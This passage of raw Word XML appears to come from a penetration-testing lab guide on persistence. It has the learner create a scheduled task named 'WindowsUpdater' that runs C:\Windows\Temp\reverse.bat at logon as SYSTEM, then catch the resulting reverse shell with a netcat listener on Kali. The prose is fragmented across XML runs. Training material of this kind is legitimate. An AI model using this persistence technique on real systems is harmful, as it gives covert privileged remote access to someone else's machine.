          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>reverse.bat</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2252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You can read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he c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nt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nts of rever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e.bat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w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ith this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mm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and:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>type C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Tem</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>reverse.bat</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160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Note: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o del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te rever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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.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bat,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n the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hell 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ter:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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color w:val="CC6600"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>del C:\Windows\Temp\reverse.bat</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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lastRenderedPageBreak/>
        <w:t>6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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Create </w:t>
      </w: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t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he S</w:t>
      </w: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 xml:space="preserve">heduled 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>T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ask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on Deann</w:t>
      </w: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a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-PC</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In your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shell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on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-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C, enter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ollow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ng (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line):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>schtasks /create /tn "Window</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Updater" /sc onlogon /rl HIGHEST /ru</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SYSTEM /tr "C:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Window</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Tem</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>reverse.bat" /f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="2160" w:right="1186" w:hanging="36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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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V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eri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y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e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ul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sk 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"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Up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er"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cc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ully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b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een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creat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5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, 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it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y,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nd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wi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l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un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er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YST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EM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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>schtasks /query /tn "Window</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Updater" /fo LIST /v</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Note: If neces</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, dele</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e the task a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="2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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reate i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Once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y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u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nf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pacing w:val="-4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m the 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sk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is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,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clo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e your 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cket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shell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K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li.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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7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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Set </w:t>
      </w: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U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p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Your Li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tener on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Kali</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In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Ka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li,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open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other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er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l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nd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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">nc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lvnp 443</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Le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v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 t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 liste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er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un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g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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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8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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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T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 xml:space="preserve">t </w:t>
      </w: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t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he Per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iste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>n</w:t>
      </w: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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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 t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ig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g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er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he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v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se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he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l:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Log in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-pc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CC660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CC660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CC660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CC6600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CC660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CC6600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CC660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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/ C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1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CC6600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CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-3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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>uz</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC660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CC6600"/>
          <w:spacing w:val="-2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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">! </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="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(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simu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 th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part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 lab)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="20"/>
        <w:ind w:left="252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-    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="30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If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y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ogg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in, log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her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nd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hen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og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ck i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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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 xml:space="preserve">-    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="30"/>
          <w:position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position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he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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2"/>
          <w:position w:val="-1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-2"/>
          <w:position w:val="-1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1"/>
          <w:position w:val="-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ul</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position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position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-2"/>
          <w:position w:val="-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sk wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
